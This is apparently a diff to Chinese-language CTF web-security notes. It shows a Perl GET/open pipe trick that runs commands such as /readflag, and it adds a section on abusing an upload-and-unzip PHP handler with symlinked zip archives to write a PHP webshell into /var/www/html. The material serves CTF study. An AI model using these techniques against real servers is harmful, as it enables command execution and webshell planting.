@@ -51,7 +51,7 @@ arjun  -u http://e3.buuoj.cn/ -c 100 -d 5
 
 ^
 ## **linux中程序漏洞**
-GET函数漏洞
+#### **GET函数漏洞**
 >低层的open函数存在命令执行漏洞：如果open文件名中存在管道符（也叫或符号|），就会将文件名直接以命令的形式执行，然后将命令的结果存到与命令同名的文件中(前提先有这个文件)。
 ```
 GET /
@@ -62,6 +62,34 @@ GET file:|readflag
 GET file:bash -c /readflag|
 会执行readflag程序命令，并返回程序执行结果到readflag|文件，没有先创建。
 ```
+
+
+^
+#### **unzip命令危害软连接**
+已知一个程序是要你上传zip压缩包，然后自动解压到/tmp目录。我们想让他解压到web后门。
+```
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
+    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
+};
+```
+我们的可以创建一个名文linkto的软链接文件，指定的链接地址为/var/www/html/，并压缩为linkto.zip
+```
+ln -s /var/www/html linkto 
+zip --symlinks linkto.zip linkto
+```
+同时创建一个名为linkto的目录，目录里放一个php木马，再返回上一级压缩目录为linkto1.zip
+```
+cd ../
+zip -r linkto1.zip ./*
+```
+先上传linkto.zip，再上传linkto1.zip即可再web目录写下木马。
+
+
+
+
+
+
 
 
 ^
@@ -78,3 +106,4 @@ Host: challenge.wucup.cn:38308
 
 GET /Kawakaze HTTP/1.1
 ```
+
